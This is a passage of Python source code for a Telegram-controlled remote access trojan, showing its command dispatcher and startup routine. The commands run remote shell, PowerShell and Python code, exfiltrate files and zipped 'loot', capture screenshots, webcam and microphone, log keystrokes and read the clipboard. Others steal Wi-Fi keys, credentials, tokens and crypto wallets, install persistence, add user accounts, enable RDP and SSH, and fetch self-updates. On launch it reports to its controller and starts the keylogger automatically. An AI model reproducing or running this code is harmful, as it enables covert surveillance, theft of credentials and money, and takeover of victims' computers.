        chat = m['chat']['id']
        text = m.get('text') or m.get('caption') or ''
        mid = m.get('message_id')
        uid = (m.get('from') or {}).get('id')
        if uid not in self.admins and chat not in self.admins:
            return self.front(chat, text, m)
        if not text.startswith('/') and (not m.get('document')):
            return
        parts = text.split(None, 1)
        cmd = parts[0].split('@')[0].lower()
        arg = parts[1].strip() if len(parts) > 1 else ''
        try:
            self.dispatch(cmd, arg, chat, m, mid)
        except Exception as e:
            ledger(self.c, chat, '`err: %r`' % (e,))

    def dispatch(self, cmd, arg, chat, m, mid):
        c = self.c
        if cmd in ('/help', '/start', '/h'):
            ledger(c, chat, HELP.format(name=CFG['APP'], host=socket.gethostname(), user=os.environ.get('USERNAME') or os.environ.get('USER', '?'), adm=socket()))
            return
        if cmd == '/ping':
            ledger(c, chat, '`pong` · up %ds · pid %d' % (int(time.time() - START), os.getpid()))
            return
        if cmd == '/sys':
            ledger(c, chat, quill())
            return
        if cmd == '/id':
            ledger(c, chat, 'chat `%s`\nuid `%s`\nhwid `%s`\npid `%d`' % (chat, chain(m), digest(), os.getpid()))
            return
        if cmd in ('/env', '/net'):
            if cmd == '/net':
                o = buffer('ipconfig /all' if IS_WIN else 'ip a; echo ---; ip route; echo ---; cat /etc/resolv.conf')
            else:
                o = '\n'.join(('%s=%s' % (k, v) for k, v in sorted(os.environ.items())))
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/locate':
            try:
                import requests
                j = requests.get('http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,org,query', timeout=15).json()
                ledger(c, chat, '```\n%s\n```' % json.dumps(j, indent=2))
            except Exception as e:
                ledger(c, chat, '`err %r`' % e)
            return
        if cmd in ('/ls', '/dir'):
            p = self._abs(arg or self.cwd)
            try:
                rows = []
                with os.scandir(p) as it:
                    for e in sorted(it, key=lambda x: (not x.is_dir(), x.name.lower()))[:200]:
                        try:
                            sz = e.stat().st_size
                            rows.append('%s %10s  %s' % ('d' if e.is_dir() else '-', slate(sz) if not e.is_dir() else '', e.name))
                        except Exception:
                            rows.append('?           ?  ' + e.name)
                ledger(c, chat, '*%s*\n```\n%s\n```' % (p, '\n'.join(rows) or '(empty)'))
            except Exception as e:
                ledger(c, chat, '`err %r`' % e)
            return
        if cmd == '/cd':
            p = self._abs(arg)
            if os.path.isdir(p):
                self.cwd = p
                os.chdir(p)
                ledger(c, chat, '`cwd -> %s`' % p)
            else:
                ledger(c, chat, '`not a dir: %s`' % p)
            return
        if cmd == '/cat':
            p = self._abs(arg)
            try:
                with open(p, 'rb') as f:
                    b = f.read(300 * 1024)
                ledger(c, chat, '```\n%s\n```' % b.decode('utf-8', 'replace')[:3800])
            except Exception as e:
                ledger(c, chat, '`err %r`' % e)
            return
        if cmd in ('/get', '/dl'):
            prism(c, chat, self._abs(arg))
            return
        if cmd == '/put':
            ledger(c, chat, '`send me a file with caption: /put <full target path>`')
            return
        if cmd == '/zip':
            z, n = orbit([self._abs(arg)] if arg else pulse())
            if z:
                prism(c, chat, z, '`%s entries`' % n)
                try:
                    os.remove(z)
                except Exception:
                    pass
            else:
                ledger(c, chat, '`%s`' % n)
            return
        if cmd == '/grab':
            ledger(c, chat, '`collecting loot...`')
            z, n = orbit(pulse())
            if z:
                prism(c, chat, z, '`loot: %s entries`' % n)
                try:
                    os.remove(z)
                except Exception:
                    pass
            else:
                ledger(c, chat, '`%s`' % n)
            return
        if cmd in ('/shell', '/sh', '/cmd'):
            if not arg:
                return ledger(c, chat, '`usage: /shell <cmd>`')
            out = buffer(arg, cwd=self.cwd)
            ledger(c, chat, '```\n%s\n```' % out[:3800])
            return
        if cmd in ('/ps', '/powershell'):
            if not arg:
                return ledger(c, chat, '`usage: /ps <command>`')
            out = buffer('powershell -NoProfile -ExecutionPolicy Bypass -Command "%s"' % arg.replace('"', '\\"') if IS_WIN else arg, cwd=self.cwd)
            ledger(c, chat, '```\n%s\n```' % out[:3800])
            return
        if cmd == '/py':
            if not arg:
                return ledger(c, chat, '`usage: /py <code>`')
            buf = io.StringIO()
            old = sys.stdout
            sys.stdout = buf
            try:
                exec(arg, {'__name__': '__exec__', 'os': os, 'sys': sys})
            except Exception:
                print(_tb.format_exc())
            finally:
                sys.stdout = old
            ledger(c, chat, '```\n%s\n```' % (buf.getvalue() or '(no output)')[:3800])
            return
        if cmd == '/exec':
            if not arg:
                return ledger(c, chat, '`usage: /exec <path> [args]`')
            buffer(arg, timeout=180)
            ledger(c, chat, '`spawned`')
            return
        if cmd == '/download':
            a = arg.split(None, 1)
            if len(a) < 2:
                return ledger(c, chat, '`usage: /download <url> <dest>`')
            try:
                import requests
                with requests.get(a[0], stream=True, timeout=60) as r:
                    r.raise_for_status()
                    with open(self._abs(a[1]), 'wb') as f:
                        for ch in r.iter_content(65536):
                            if ch:
                                f.write(ch)
                ledger(c, chat, '`downloaded -> %s`' % self._abs(a[1]))
            except Exception as e:
                ledger(c, chat, '`err %r`' % e)
            return
        if cmd == '/screenshot':
            p = ridge()
            if p:
                prism(c, chat, p, '`screenshot`')
                try:
                    os.remove(p)
                except Exception:
                    pass
            else:
                ledger(c, chat, '`capture failed`')
            return
        if cmd == '/webcam':
            p = queue()
            if p:
                prism(c, chat, p, '`webcam`')
                try:
                    os.remove(p)
                except Exception:
                    pass
            else:
                ledger(c, chat, '`no camera / blocked`')
            return
        if cmd == '/mic':
            ledger(c, chat, '`recording %ss...`' % (arg or 5))
            p = parse(int(arg) if arg.isdigit() else 5)
            if p:
                prism(c, chat, p, '`mic`')
                try:
                    os.remove(p)
                except Exception:
                    pass
            else:
                ledger(c, chat, '`mic failed`')
            return
        if cmd == '/keylog':
            a = arg.lower()
            if a == 'start':
                ledger(c, chat, '`%s`' % self.spy.start())
            elif a == 'stop':
                ledger(c, chat, '`%s`' % self.spy.stop())
            elif a == 'clear':
                ledger(c, chat, '`%s`' % self.spy.clear())
            elif a == 'dump':
                d = self.spy.dump()
                p = os.path.join(tempfile.gettempdir(), 'keys_%s.txt' % uuid.uuid4().hex[:6])
                with open(p, 'w', encoding='utf-8', errors='replace') as f:
                    f.write(d)
                prism(c, chat, p, '`keylog dump`')
                try:
                    os.remove(p)
                except Exception:
                    pass
            else:
                ledger(c, chat, '`/keylog start|stop|dump|clear`')
            return
        if cmd == '/clip':
            ledger(c, chat, '```\n%s\n```' % (stream() or '(empty)'))
            return
        if cmd == '/notify':
            ledger(c, chat, '`sent to host`')
            try:
                if IS_WIN:
                    buffer('msg * "%s"' % arg.replace('"', "'"))
                else:
                    buffer('notify-send "%s" "%s"' % (CFG['APP'], arg.replace('"', "'")))
            except Exception:
                pass
            return
        if cmd == '/msg':
            try:
                if IS_WIN:
                    buffer('powershell -NoProfile -Command "[System.Windows.Forms.MessageBox]::Show(\'%s\')"' % arg.replace("'", "''") if False else 'msg * "%s"' % arg.replace('"', "'"))
                else:
                    buffer('zenity --info --text="%s" &' % arg.replace('"', "'"))
            except Exception:
                pass
            ledger(c, chat, '`delivered`')
            return
        if cmd == '/open':
            try:
                if IS_WIN:
                    os.startfile(arg) if hasattr(os, 'startfile') else buffer('start "" "%s"' % arg)
                elif IS_MAC:
                    buffer('open "%s"' % arg)
                else:
                    buffer('xdg-open "%s" >/dev/null 2>&1 &' % arg)
                ledger(c, chat, '`opened`')
            except Exception as e:
                ledger(c, chat, '`err %r`' % e)
            return
        if cmd == '/wall':
            ledger(c, chat, '`%s`' % route(arg))
            return
        if cmd == '/lock':
            ledger(c, chat, '`%s`' % bridge())
            return
        if cmd == '/sleep':
            ledger(c, chat, '`sleeping`')
            try:
                if IS_WIN:
                    buffer('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
                elif IS_MAC:
                    buffer('pmset sleepnow')
                else:
                    buffer('systemctl suspend')
            except Exception:
                pass
            return
        if cmd == '/shutdown':
            ledger(c, chat, '`shutting down`')
            buffer('shutdown /s /f /t 0' if IS_WIN else 'shutdown -h now')
            return
        if cmd == '/reboot':
            ledger(c, chat, '`rebooting`')
            buffer('shutdown /r /f /t 0' if IS_WIN else 'reboot')
            return
        if cmd == '/ddns':
            ledger(c, chat, token())
            return
        if cmd == '/bind':
            if not arg.isdigit():
                return ledger(c, chat, '`usage: /bind <port>`')
            secret = hashlib.sha256(('%s-%s' % (CFG['MUTEX'], self.admin)).encode()).hexdigest()[:16]
            ledger(c, chat, '`%s`\nsecret: `%s`' % (weave(arg, secret), secret))
            return
        if cmd == '/procs':
            if IS_WIN:
                o = buffer('tasklist /fo csv')
            else:
                o = buffer('ps aux --sort=-%cpu | head -80')
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/users':
            o = buffer('net user' if IS_WIN else 'cat /etc/passwd | cut -d: -f1,3,7')
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/drives':
            if IS_WIN:
                o = buffer('wmic logicaldisk get name,size,freespace,volumename')
            else:
                o = buffer('df -h')
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/wifi':
            if IS_WIN:
                o = buffer('netsh wlan show profiles') + '\n---\n'
                for name in re.findall('All User Profile\\s*:\\s*(.+)', buffer('netsh wlan show profiles')):
                    o += buffer('netsh wlan show profile name="%s" key=clear' % name.strip())
            elif IS_MAC:
                o = buffer("security find-generic-password -a $USER -s 'AirPort' -w 2>&1")
            else:
                o = buffer("cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -iE 'ssid|psk'")
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/history':
            o = []
            for p in ('~/.bash_history', '~/.zsh_history'):
                p = os.path.expanduser(p)
                if os.path.isfile(p):
                    o.append('== ' + p + ' ==\n' + open(p, errors='replace').read()[-2500:])
            ledger(c, chat, '```\n%s\n```' % ('\n'.join(o) or '(none)')[:3800])
            return
        if cmd == '/creds':
            ledger(c, chat, '```\n%s\n```' % sync()[:3800])
            return
        if cmd == '/tokens':
            ledger(c, chat, '`scanning...`')
            ledger(c, chat, '```\n%s\n```' % index()[:3800])
            return
        if cmd == '/wallets':
            ledger(c, chat, '```\n%s\n```' % fetch()[:3800])
            return
        if cmd == '/persist':
            ledger(c, chat, '```\n%s\n```' % transit()[:3800])
            return
        if cmd == '/unpersist':
            ledger(c, chat, '```\n%s\n```' % cluster()[:3800])
            return
        if cmd == '/watchdog':
            ledger(c, chat, '`%s`' % worker(vector()))
            return
        if cmd == '/startup':
            o = buffer('reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"' if IS_WIN else 'systemctl --user list-unit-files | head -40; crontab -l')
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/registry':
            ledger(c, chat, '`usage: /registry <path>`')
            o = buffer('reg query "%s"' % (arg or 'HKCU\\\\Software'))
            ledger(c, chat, '```\n%s\n```' % o[:3800])
            return
        if cmd == '/owner':
            a = arg.split()
            if len(a) < 2:
                return ledger(c, chat, '`usage: /owner <username> <password>`')
            ledger(c, chat, '```\n%s\n```' % slot(a[0], a[1])[:3800])
            return
        if cmd == '/rdp':
            ledger(c, chat, '`%s`' % spine(arg.lower() in ('on', '1', 'yes', 'true')))
            return
        if cmd == '/ssh':
            ledger(c, chat, '`%s`' % spine(arg.lower() in ('on', '1', 'yes', 'true')))
            return
        if cmd in ('/kill', '/exit'):
            ledger(c, chat, '`shutting down agent`')
            self.alive = False
            os._exit(0)
        if cmd == '/update':
            if not arg.startswith('http'):
                return ledger(c, chat, '`usage: /update <url>`')
            try:
                import requests
                dst = vector()
                with requests.get(arg, stream=True, timeout=60) as r:
                    r.raise_for_status()
                    with open(dst + '.new', 'wb') as f:
                        for ch in r.iter_content(65536):
                            f.write(ch)
                os.replace(dst + '.new', dst)
                ledger(c, chat, '`updated — restarting`')
                os.execl(sys.executable, sys.executable, dst)
            except Exception as e:
                ledger(c, chat, '`err %r`' % e)
            return
        if cmd == '/reinstall':
            ledger(c, chat, '```\n%s\n```' % transit())
            return
        ledger(c, chat, '`unknown: %s` — /help' % cmd)

    def _abs(self, p):
        if not p:
            return self.cwd
        p = os.path.expandvars(os.path.expanduser(p))
        return p if os.path.isabs(p) else os.path.normpath(os.path.join(self.cwd, p))

    def run(self):
        self.me = self.c.call('getMe')
        while self.alive:
            try:
                res = self.c.call('getUpdates', offset=self.off, timeout=POLL_T - 5, allowed_updates=['message', 'callback_query'])
                if not res:
                    time.sleep(2)
                    continue
                for u in res:
                    self.off = max(self.off, u['update_id'] + 1)
                    m = u.get('message') or (u.get('callback_query') or {}).get('message')
                    if not m:
                        continue
                    cap = m.get('caption') or ''
                    if m.get('document') and cap.lower().startswith('/put'):
                        self._recv_doc(m, cap[4:].strip())
                        continue
                    self.handle(m)
            except Exception as e:
                trace('loop err %r' % (e,))
                time.sleep(3)

    def _recv_doc(self, m, dest):
        try:
            f = m['document']
            info = self.c.call('getFile', file_id=f['file_id'])
            if not info:
                return ledger(self.c, m['chat']['id'], '`getFile failed`')
            url = 'https://api.telegram.org/file/bot%s/%s' % (CFG['TOKEN'], info['file_path'])
            import requests
            dst = self._abs(dest or f.get('file_name') or 'upload.bin')
            os.makedirs(os.path.dirname(dst) or '.', exist_ok=True)
            with requests.get(url, stream=True, timeout=120) as r:
                with open(dst, 'wb') as out:
                    for ch in r.iter_content(65536):
                        out.write(ch)
            ledger(self.c, m['chat']['id'], '`saved -> %s`' % dst)
        except Exception as e:
            ledger(self.c, m['chat']['id'], '`err %r`' % (e,))

def chain(m):
    return (m.get('from') or {}).get('id')
START = time.time()

def cache():
    try:
        if IS_WIN:
            import ctypes
            h = ctypes.windll.kernel32.CreateMutexW(None, False, 'Global\\%s' % CFG['MUTEX'])
            if ctypes.windll.kernel32.GetLastError() == 183:
                return False
            return h
        import fcntl
        p = os.path.join(tempfile.gettempdir(), '.%s.lock' % CFG['TAG'].strip('.'))
        fh = open(p, 'w')
        try:
            fcntl.flock(fh, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except Exception:
            return False
        return fh
    except Exception:
        return None

def frame():
    token = CFG['TOKEN']
    admin = CFG['ADMIN']
    if not token or 'paste-your-bot-token' in str(token) or (not str(admin).isdigit()) or (int(admin) <= 0):
        token = os.environ.get('LB_TOKEN', token)
        admin = os.environ.get('LB_ADMIN', admin)
    if not token or 'paste-your-bot-token' in str(token) or (not str(admin).isdigit()) or (int(admin) <= 0):
        return
    a = beacon(token, admin)
    try:
        ledger(a.c, int(admin), '*%s online*' % CFG['APP'] + '\n`host` `%s` · `pid %d` · `admin=%s`\n`c2` `%s`\n\n' % (socket.gethostname(), os.getpid(), socket(), CFG['DDNS_HOST']) + HELP.format(name=CFG['APP'], host=socket.gethostname(), user=os.environ.get('USERNAME') or os.environ.get('USER', '?'), adm=socket()))
    except Exception:
        pass
    try:
        transit()
    except Exception:
        pass
    try:
        a.spy.start()
    except Exception:
        pass
    try:
        threading.Thread(target=delta, daemon=True).start()
    except Exception:
        pass
    try:
        if int(CFG.get('BIND_PORT') or 0) > 0:
            secret = hashlib.sha256(('%s-%s' % (CFG['MUTEX'], admin)).encode()).hexdigest()[:16]
            weave(int(CFG['BIND_PORT']), secret)
    except Exception:
        pass
    a.run()
if __name__ == '__main__':
    try:
        cache()
    except Exception:
        pass
    if cache() is False:
        sys.exit(0)
    if 'paste-your-bot-token' in str(CFG.get('TOKEN')) or not str(CFG.get('ADMIN', 0)).isdigit() or int(CFG.get('ADMIN', 0)) <= 0:
        sys.exit(0)
    while True:
        try:
            frame()
        except Exception as e:
            trace('boot err %r' % (e,))
        time.sleep(20)